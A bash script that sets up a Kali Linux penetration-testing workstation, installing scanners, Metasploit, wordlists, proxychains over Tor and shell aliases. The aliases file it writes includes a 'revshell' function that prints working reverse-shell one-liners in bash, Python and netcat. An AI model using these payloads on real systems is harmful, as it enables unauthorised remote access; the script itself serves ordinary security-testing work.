#!/bin/bash

# =================================================================
# Kali Linux Pentesting Environment Setup Script
# =================================================================
# Description: Automated setup for Kali Linux and other security
#              distributions with focus on web/server pentesting.
#
# Author: Nyteko
# Version: 2.0
# License: AGPL-3.0 
#
# Requirements:
#   - Kali Linux, Parrot OS, BlackArch, or Pentoo
#   - Non-root user with sudo privileges
#   - Internet connection
#
# Usage: 
#   ./Setup.sh          # Interactive installation
#   ./Setup.sh --help   # Show all options
#
# Features:
#   - Cross-distribution package management
#   - Python virtual environments for isolation
#   - Common pentesting tools and scripts
#   - Modern CLI tools and configurations
#   - Docker and container support
#   - Modular installation with interactive menu
# =================================================================

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to check if running as root
check_root() {
    if [[ $EUID -eq 0 ]]; then
        print_error "This script should not be run as root!"
        exit 1
    fi
}

# Function to create directories
create_directories() {
    print_status "Creating directory structure..."
    
    # Create main pentesting directory
    mkdir -p "$INSTALL_DIR"
    
    # Create subdirectories
    mkdir -p "$INSTALL_DIR"/{tools,targets,reports,wordlists,scripts,notes}
    mkdir -p ~/venvs/{pentesting,webapp}
    
    print_success "Directory structure created"
}

# Function to update system
update_system() {
    print_status "Updating system packages..."
    case "$PKG_MANAGER" in
        apt)
            sudo apt update && sudo apt upgrade -y
            ;;
        dnf)
            sudo dnf update -y
            ;;
        pacman)
            sudo pacman -Syu --noconfirm
            ;;
    esac
    print_success "System updated"
}

# Detect package manager (apt, dnf, pacman)
detect_pkg_manager() {
    if command -v apt &>/dev/null; then
        PKG_MANAGER="apt"
    elif command -v dnf &>/dev/null; then
        PKG_MANAGER="dnf"
    elif command -v pacman &>/dev/null; then
        PKG_MANAGER="pacman"
    else
        print_error "No supported package manager found (apt, dnf, pacman)."
        exit 1
    fi
    print_status "Using package manager: $PKG_MANAGER"
}

# Check dependencies
check_dependencies() {
    print_status "Checking required dependencies..."
    local deps=(curl wget git sudo jq)
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        print_warning "Installing missing dependencies: ${missing[*]}"
        for pkg in "${missing[@]}"; do
            install_pkg "$pkg"
        done
    fi
}

# Enhanced variable declarations
declare -g -r SCRIPT_VERSION="2.0"
declare -g -r SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
declare -g -r INSTALL_DIR="$HOME/pentesting"
declare -g -A TOOL_CONFIGS
declare -g -a TEMP_DIRS
declare -g LOG_FILE="/tmp/setup_$(date +%Y%m%d_%H%M%S).log"

# Error handling with line numbers and command logging
trap 'err_handler $? $LINENO "$BASH_COMMAND"' ERR
trap 'cleanup_handler' EXIT
trap 'interrupt_handler' INT TERM

err_handler() {
    local exit_code=$1
    local line_no=$2
    local command="$3"
    local func_name="${FUNCNAME[1]:-main}"
    
    print_error "Error in $func_name() on line $line_no: '$command' exited with status $exit_code"
    printf "[ERROR] %s() Line %s: '%s' failed with status %d\n" \
           "$func_name" "$line_no" "$command" "$exit_code" >> "$LOG_FILE"
}

cleanup_handler() {
    local exit_code=$?
    print_status "Performing cleanup..."
    
    # Clean up temporary directories
    for dir in "${TEMP_DIRS[@]}"; do
        if [[ -d "$dir" ]]; then
            rm -rf "$dir"
            print_status "Removed temporary directory: $dir"
        fi
    done
    
    # Clean up incomplete installations on error
    if [[ $exit_code -ne 0 ]]; then
        print_warning "Script exited with errors. Check $LOG_FILE for details."
    fi
}

interrupt_handler() {
    print_warning "Script interrupted by user"
    exit 130
}

# Improved temporary directory management
create_temp_dir() {
    local temp_dir
    temp_dir=$(mktemp -d) || {
        print_error "Failed to create temporary directory"
        return 1
    }
    TEMP_DIRS+=("$temp_dir")
    printf '%s\n' "$temp_dir"
}

# Install a package using the detected package manager
install_pkg() {
    local pkg="$1"
    local retries=3
    local wait_time=5
    local attempt=1

    while [ $attempt -le $retries ]; do
        print_status "Installing $pkg (attempt $attempt/$retries)..."
        case "$PKG_MANAGER" in
            apt)
                if sudo DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" >>"$LOG_FILE" 2>&1; then
                    print_success "$pkg installed successfully"
                    return 0
                fi
                ;;
            dnf)
                if sudo dnf install -y "$pkg" >>"$LOG_FILE" 2>&1; then
                    print_success "$pkg installed successfully"
                    return 0
                fi
                ;;
            pacman)
                if sudo pacman -S --noconfirm "$pkg" >>"$LOG_FILE" 2>&1; then
                    print_success "$pkg installed successfully"
                    return 0
                fi
                ;;
        esac
        
        attempt=$((attempt + 1))
        [ $attempt -le $retries ] && sleep $wait_time
    done

    print_error "Failed to install $pkg after $retries attempts"
    return 1
}

# Helper function for package installation with error handling
install_and_check() {
    local pkg="$1"
    local retry_count=3
    local attempt=1

    while [ $attempt -le $retry_count ]; do
        print_status "Installing $pkg (attempt $attempt/$retry_count)..."
        if install_pkg "$pkg"; then
            print_success "$pkg installed successfully"
            return 0
        fi
        attempt=$((attempt + 1))
        sleep 2  # Brief pause before retry
    done

    print_error "Failed to install $pkg after $retry_count attempts"
    return 1
}

# Optimized directory operations
pushd_quiet() {
    pushd "$1" &>/dev/null || {
        print_error "Failed to change directory to $1"
        return 1
    }
}

popd_quiet() {
    popd &>/dev/null || {
        print_error "Failed to return to previous directory"
        return 1
    }
}

# Optimized clone function
clone_repo() {
    local repo_url="$1"
    local target_dir="$2"
    local repo_name="${repo_url##*/}"
    repo_name="${repo_name%.git}"
    
    if [[ ! -d "$target_dir/$repo_name" ]]; then
        {
            git clone --quiet "$repo_url" "$target_dir/$repo_name" &&
            print_success "Cloned $repo_name"
        } >> "$LOG_FILE" 2>&1 || {
            print_error "Failed to clone $repo_name"
            return 1
        }
    else
        pushd_quiet "$target_dir/$repo_name" || return 1
        git pull --quiet && print_success "Updated $repo_name" || print_error "Failed to update $repo_name"
        popd_quiet || return 1
    fi
}

# Function to install essential packages
install_essential_packages() {
    print_status "Installing essential and pentesting packages..."
    
    # Group packages by type
    declare -A PKG_GROUPS=(
        ["base"]="curl wget git vim nano build-essential"
        ["python"]="python3-pip python3-venv python3-dev"
        ["utils"]="tree htop unzip p7zip-full"
        ["network"]="net-tools dnsutils nmap masscan"
        ["web"]="nikto dirb gobuster feroxbuster whatweb wapiti ffuf"
    )

    # Install packages by group
    for group in "${!PKG_GROUPS[@]}"; do
        print_status "Installing $group packages..."
        for pkg in ${PKG_GROUPS[$group]}; do
            install_and_check "$pkg" || print_warning "Failed to install $pkg"
        done
    done

    print_success "Package installation completed"
}

# Function to get latest GitHub release URL
get_github_release_url() {
    local repo="$1"
    local pattern="$2"
    local api_url="https://api.github.com/repos/$repo/releases/latest"
    local download_url
    local response
    
    response=$(curl -sL "$api_url") || return 1
    download_url=$(jq -r --arg pat "$pattern" \
        '.assets[] | select(.name | test($pat)) | .browser_download_url' <<< "$response" | head -n1)
    
    if [[ -z "$download_url" ]]; then
        print_error "Failed to get latest release URL for $repo"
        return 1
    fi
    printf '%s\n' "$download_url"
}

# Function to verify GPG signatures
verify_gpg_signature() {
    local file="$1"
    local signature="$2"
    local keyid="$3"

    if ! command -v gpg &>/dev/null; then
        print_error "GPG not installed. Cannot verify signatures."
        return 1
    fi

    # Import key if not already present
    if ! gpg --list-keys "$keyid" &>/dev/null; then
        gpg --keyserver keyserver.ubuntu.com --recv-keys "$keyid" || {
            print_error "Failed to import GPG key $keyid"
            return 1
        }
    fi

    # Verify signature
    if ! gpg --verify "$signature" "$file"; then
        print_error "GPG signature verification failed for $file"
        return 1
    fi

    print_success "GPG signature verified for $file"
    return 0
}

# Enhanced security verification with multiple methods
verify_artifact() {
    local file="$1"
    local type="$2"
    local reference="$3"
    
    case "$type" in
        gpg)
            verify_gpg_signature "$file" "$file.asc" "$reference"
            ;;
        sha256)
            echo "$reference $file" | sha256sum -c - >/dev/null || {
                print_error "SHA256 verification failed for $file"
                return 1
            }
            ;;
        sha512)
            echo "$reference $file" | sha512sum -c - >/dev/null || {
                print_error "SHA512 verification failed for $file"
                return 1
            }
            ;;
        *)
            print_warning "No verification method specified for $file"
            return 0
            ;;
    esac
}

# Function to configure VMware tools
configure_vmware_tools() {
    print_status "Configuring VMware tools..."
    
    # Enable and start VMware services
    sudo systemctl enable open-vm-tools
    sudo systemctl start open-vm-tools
    
    # Configure shared folders if needed
    sudo mkdir -p /mnt/hgfs
    
    print_success "VMware tools configured"
}

# Function to check OS compatibility
check_os() {
    print_status "Checking OS compatibility..."
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        ARCH=$(uname -m)
        case "$ID" in
            kali|parrot|blackarch|pentoo)
                print_success "Detected supported OS: $ID ($ARCH)"
                ;;
            *)
                print_warning "This script is optimized for Kali, Parrot, BlackArch, or Pentoo. Proceeding anyway, but some features may not work."
                ;;
        esac
        print_status "System architecture: $ARCH"
    else
        print_warning "Cannot detect OS. Proceeding, but some features may not work."
    fi
}

# Function to configure Metasploit database
configure_metasploit() {
    print_status "Configuring Metasploit database..."
    if ! sudo systemctl start postgresql; then
        print_error "Failed to start postgresql. Possible causes:"
        echo " - PostgreSQL is not installed or enabled."
        echo " - Service name may differ on your distribution."
        echo "Try: sudo apt install postgresql && sudo systemctl enable postgresql"
        return 1
    fi
    if ! sudo msfdb init; then
        print_warning "Metasploit database initialization failed."
        echo "Possible causes:"
        echo " - Database already initialized."
        echo " - Permission issues (try running with sudo)."
        echo " - PostgreSQL is not running or misconfigured."
        echo "Manual fix: sudo msfdb reinit"
    fi
    sudo systemctl enable postgresql
    print_success "Metasploit database configuration attempted."
}

# Unified aliases and functions setup
setup_unified_aliases() {
    print_status "Setting up unified pentesting aliases and functions..."
    mkdir -p ~/.config/zsh
    cat > ~/.config/zsh/pentesting_aliases.zsh << 'EOF'
# ~/.config/zsh/pentesting_aliases.zsh
# All pentesting aliases and functions in one place.

# --- Aliases ---
alias ports="netstat -tuln"
alias myip="curl -s ifconfig.me"
alias localip="ip addr show | grep 'inet ' | grep -v 127.0.0.1"
alias httpsrv="python3 -m http.server"
alias smbsrv="impacket-smbserver share ."
alias revshell="nc -lvnp"
alias enum="~/pentesting/tools/LinEnum/LinEnum.sh"
alias pentest="source ~/venvs/pentesting/bin/activate"
alias webapp="source ~/venvs/webapp/bin/activate"
alias pendir="cd ~/pentesting"
alias tools="cd ~/pentesting/tools"
alias targets="cd ~/pentesting/targets"
alias reports="cd ~/pentesting/reports"
alias quickscan="nmap -sS -O -sV --version-intensity 5 --script=default"
alias fullscan="nmap -sS -sU -O -sV -sC -A -p-"
alias webscan="nmap -sS -sV -p80,443,8080,8443 --script=http-*"
alias shared="cd /mnt/hgfs"
alias newscreen="screen -S"
alias listscreen="screen -ls"
alias term="terminator"
alias termconfig="terminator --preferences"

# --- Functions ---
target() {
    if [[ -z "$1" ]]; then
        echo "Usage: target <name> [IP]"
        return 1
    fi
    ~/pentesting/scripts/init_target.sh "$1" "${2:-}"
}
revshell() {
    if [[ -z "$1" ]] || [[ -z "$2" ]]; then
        echo "Usage: revshell <LHOST> <LPORT>"
        echo "Generates common reverse shell payloads"
        return 1
    fi
    local lhost="$1"
    local lport="$2"
    echo "=== REVERSE SHELL PAYLOADS ==="
    echo ""
    echo "Bash:"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo ""
    echo "Python:"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo "NC (traditional):"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
}
qscan() { if [[ -z "$1" ]]; then echo "Usage: qscan <target>"; return 1; fi; nmap -sS -sV -O -T4 --top-ports 1000 "$1"; }
fscan() { if [[ -z "$1" ]]; then echo "Usage: fscan <target>"; return 1; fi; nmap -sS -sC -sV -O -T4 -p- "$1"; }
wscan() { if [[ -z "$1" ]]; then echo "Usage: wscan <target>"; return 1; fi; nmap -sS -sV -p80,443,8080,8443,8000,3000,5000 --script=http-* "$1"; }
EOF

    # Ensure .zshrc sources the unified aliases file only once
    if ! grep -q "pentesting_aliases.zsh" ~/.zshrc 2>/dev/null; then
        echo "" >> ~/.zshrc
        echo "# Load unified pentesting aliases and functions" >> ~/.zshrc
        echo "[[ -f ~/.config/zsh/pentesting_aliases.zsh ]] && source ~/.config/zsh/pentesting_aliases.zsh" >> ~/.zshrc
    fi

    print_success "Unified pentesting aliases and functions configured"
}

# Optional: Auto-activate pentesting venv on shell start
setup_auto_venv() {
    print_status "Configuring auto-activation of pentesting Python venv..."
    if ! grep -q "source ~/venvs/pentesting/bin/activate" ~/.zshrc 2>/dev/null; then
        echo "" >> ~/.zshrc
        echo "# Auto-activate pentesting Python venv" >> ~/.zshrc
        echo "[[ -f ~/venvs/pentesting/bin/activate ]] && source ~/venvs/pentesting/bin/activate" >> ~/.zshrc
        print_success "Auto-activation of pentesting venv added to .zshrc"
    else
        print_warning "Auto-activation of pentesting venv already present in .zshrc"
    fi
}

# Function to create useful scripts
create_useful_scripts() {
    print_status "Creating useful scripts..."
    
    # Port scanner script
    cat > ~/pentesting/scripts/portscan.sh << 'EOF'
#!/bin/bash
# Quick port scanner with common ports

if [ $# -eq 0 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

target=$1
echo "Scanning $target..."

# Quick scan of common ports
nmap -sS -T4 -p21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5432,5900,8080 $target

# Service version detection on open ports
echo "Running service detection..."
nmap -sV -sC $target
EOF

    # Web directory enumeration script
    cat > ~/pentesting/scripts/webenum.sh << 'EOF'
#!/bin/bash
# Web directory enumeration

if [ $# -eq 0 ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

target=$1
echo "Enumerating directories on $target..."

# Gobuster scan
gobuster dir -u $target -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js,css -t 50
EOF

    # Make scripts executable
    chmod +x ~/pentesting/scripts/*.sh
    
    print_success "Useful scripts created"
}

# Function to configure proxychains
configure_proxychains() {
    print_status "Configuring proxychains..."
    
    # Backup original config
    sudo cp /etc/proxychains4.conf /etc/proxychains4.conf.bak 2>/dev/null || true
    
    # Create custom configuration
    sudo tee /etc/proxychains4.conf > /dev/null << 'EOF'
# proxychains.conf  VER 4.x
strict_chain
proxy_dns 
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
quiet_mode

[ProxyList]
# Tor proxy
socks4 127.0.0.1 9050
EOF

    print_success "Proxychains configured"
}

# Function to setup wordlists
setup_wordlists() {
    print_status "Setting up wordlists..."
    
    cd ~/pentesting/wordlists
    
    # Download additional wordlists
    wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt || true
    
    # Create symlinks to system wordlists
    ln -sf /usr/share/wordlists/rockyou.txt.gz rockyou.txt.gz 2>/dev/null || true
    ln -sf /usr/share/seclists seclists 2>/dev/null || true
    ln -sf /usr/share/wordlists/dirbuster dirbuster 2>/dev/null || true
    
    cd ~
    print_success "Wordlists configured"
}

# === MODERN CLI TOOLS ===
install_modern_cli_tools() {
    print_status "Installing modern CLI tools..."
    
    # Install additional useful tools
    sudo apt install -y jq httpie tmux ncdu
    
    print_success "Modern CLI tools installed"
}

# === ZSH & OH MY ZSH ===
setup_zsh_environment() {
    print_status "Setting up Zsh environment..."
    
    # Install Zsh if not already installed
    if ! command -v zsh &>/dev/null; then
        install_pkg zsh
    fi
    
    # Set Zsh as default shell
    if [[ "$SHELL" != "$(which zsh)" ]]; then
        chsh -s "$(which zsh)"
    fi

    print_success "Zsh environment configured"
}

# === CONTAINER TOOLS ===
install_container_tools() {
    print_status "Installing containerization tools..."
    
    # Install Docker
    if ! command -v docker &>/dev/null; then
        curl -fsSL https://get.docker.com -o get-docker.sh
        sudo sh get-docker.sh
        sudo usermod -aG docker $USER
        rm get-docker.sh
    fi
    
    # Install Docker Compose
    if ! command -v docker-compose &>/dev/null; then
        sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
        sudo chmod +x /usr/local/bin/docker-compose
    fi
    
    print_success "Container tools installed"
}

# === ADVANCED PENTEST TOOLS ===
install_advanced_pentest_tools() {
    print_status "Installing advanced pentesting tools..."
    
    # Install additional tools
    sudo apt install -y awscli
    
    # Install kubectl
    if ! command -v kubectl &>/dev/null; then
        curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
        sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
        rm kubectl
    fi
    
    print_success "Advanced pentesting tools installed"
}

# === ADVANCED SCRIPTS ===
create_advanced_scripts() {
    print_status "Creating advanced automation scripts..."
    
    # Target initialization script
    cat > ~/pentesting/scripts/init_target.sh << 'EOF'
#!/bin/bash
if [ $# -eq 0 ]; then
    echo "Usage: $0 <target_name> [IP]"
    exit 1
fi
TARGET_NAME=$1
TARGET_IP=$2
DATE=$(date '+%Y-%m-%d')
TARGET_DIR="$HOME/pentesting/targets/$TARGET_NAME"
mkdir -p "$TARGET_DIR"/{recon,scans,exploits,loot,screenshots,notes,reports}
cat > "$TARGET_DIR/notes/README.md" << EOL
# Target: $TARGET_NAME

**Date Started:** $DATE  
**Target IP:** $TARGET_IP  
**Status:** In Progress

## Initial Information
- [ ] Domain/Hostname: 
- [ ] Operating System: 
- [ ] Key Services: 

## Reconnaissance
- [ ] Nmap scan completed
- [ ] Directory enumeration
- [ ] Service enumeration
- [ ] Vulnerability assessment

## Exploitation
- [ ] Initial foothold
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Persistence

## Cleanup
- [ ] Remove artifacts
- [ ] Document findings
EOL
echo "Target $TARGET_NAME initialized!"
echo "Directory: $TARGET_DIR"
EOF

    chmod +x ~/pentesting/scripts/*.sh
    print_success "Advanced automation scripts created"
}

# === TMUX CONFIG ===
setup_tmux_config() {
    print_status "Setting up tmux configuration..."
    cat > ~/.tmux.conf << 'EOF'
# Tmux configuration for pentesting
set -g prefix C-a
unbind C-b
bind C-a send-prefix
set -g mouse on
set -g base-index 1
setw -g pane-base-index 1
bind r source-file ~/.tmux.conf \; display-message "Config reloaded!"
bind | split-window -h
bind - split-window -v
bind h select-pane -L
bind j select-pane -D
bind k select-pane -U
bind l select-pane -R
set -g status-bg black
set -g status-fg white
set -g status-left '[#S] '
set -g status-right '#(whoami)@#H %Y-%m-%d %H:%M'
set -g status-left-length 20
set -g status-right-length 40
setw -g window-status-current-bg red
setw -g window-status-current-fg white
setw -g window-status-current-attr bold
set -g history-limit 10000
set -sg escape-time 0
setw -g monitor-activity on
set -g visual-activity on
EOF
    print_success "Tmux configuration created"
}

# Show help function
show_help() {
    cat << EOF
Usage: $0 [OPTIONS]

Options:
  --skip-tools       Skip installing tools
  --skip-zsh         Skip Zsh configuration
  --skip-docker      Skip Docker installation
  --skip-advanced    Skip advanced tools
  --help             Show this help message

Examples:
  $0                  # Interactive installation
  $0 --skip-docker    # Install everything except Docker
  $0 --help           # Show help
EOF
}

# Argument parsing for flexible execution
SKIP_TOOLS=false
SKIP_ZSH=false
SKIP_DOCKER=false
SKIP_ADVANCED=false

while [[ "$#" -gt 0 ]]; do
    case $1 in
        --skip-tools) SKIP_TOOLS=true ;;
        --skip-zsh) SKIP_ZSH=true ;;
        --skip-docker) SKIP_DOCKER=true ;;
        --skip-advanced) SKIP_ADVANCED=true ;;
        --help)
            show_help
            exit 0
            ;;
        *)
            echo "Unknown parameter passed: $1"
            exit 1
            ;;
    esac
    shift
done

# Initialize environment
initialize_environment() {
    print_status "Initializing environment..."
    # Create necessary directories
    mkdir -p ~/.config/zsh
    mkdir -p ~/venvs/{pentesting,webapp}
    print_success "Environment initialized"
}

# Check configuration
check_config() {
    print_status "Checking configuration..."
    # Basic configuration checks
    if [[ ! -d "$HOME" ]]; then
        print_error "Home directory doesn't exist"
        return 1
    fi
    print_success "Configuration check passed"
    return 0
}

# Enhanced main function with better initialization
main() {
    # Initialize logging
    exec > >(tee -a "$LOG_FILE") 2>&1
    
    print_status "Starting setup (Version: $SCRIPT_VERSION)"
    print_status "Logging to $LOG_FILE"

    # Script header
    cat << 'EOF'
===============================================
  Kali Linux Pentesting Setup Script
  Web & Server Pentesting Focus
===============================================
EOF

    # Pre-flight checks
    check_os
    detect_pkg_manager
    check_root
    check_dependencies
    initialize_environment
    
    # Ensure script directory is writable
    if [ ! -w "$SCRIPT_DIR" ]; then
        print_error "Script directory is not writable: $SCRIPT_DIR"
        exit 1
    fi
    
    check_config || {
        print_error "Configuration check failed"
        exit 1
    }
    
    # Create all required directories
    create_directories
    
    # Update system
    update_system
    
    # Install essential packages
    if [[ "$SKIP_TOOLS" == "false" ]]; then
        install_essential_packages
    fi
    
    # Setup Zsh environment
    if [[ "$SKIP_ZSH" == "false" ]]; then
        setup_zsh_environment
        setup_unified_aliases
        setup_auto_venv
    fi
    
    # Install container tools
    if [[ "$SKIP_DOCKER" == "false" ]]; then
        install_container_tools
    fi
    
    # Install advanced tools
    if [[ "$SKIP_ADVANCED" == "false" ]]; then
        install_advanced_pentest_tools
        create_advanced_scripts
        setup_tmux_config
    fi
    
    # Create useful scripts
    create_useful_scripts
    
    # Configure additional components
    configure_proxychains
    setup_wordlists
    configure_metasploit
    configure_vmware_tools
    
    # Final messages
    echo ""
    echo "==============================================="
    print_success "Setup completed successfully!"
    echo ""
    echo "Next steps:"
    echo "1. Restart your terminal or run: source ~/.zshrc"
    echo "2. Check the log file for details: $LOG_FILE"
    echo "3. Explore your new pentesting environment:"
    echo "   - cd ~/pentesting"
    echo "   - pentest (to activate Python environment)"
    echo "   - tools (to access installed tools)"
    echo ""
    echo "Available commands:"
    echo "  - pentest       # Activate pentesting Python environment"
    echo "  - webapp        # Activate web app Python environment"
    echo "  - pendir        # Go to pentesting directory"
    echo "  - tools         # Go to tools directory"
    echo "  - shared        # Go to VMware shared folders"
    echo "  - newscreen     # Create new screen session"
    echo "  - term          # Launch Terminator"
    echo ""
    print_success "Happy hacking! 🎯"
}

# Ensure the script is being run, not sourced
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi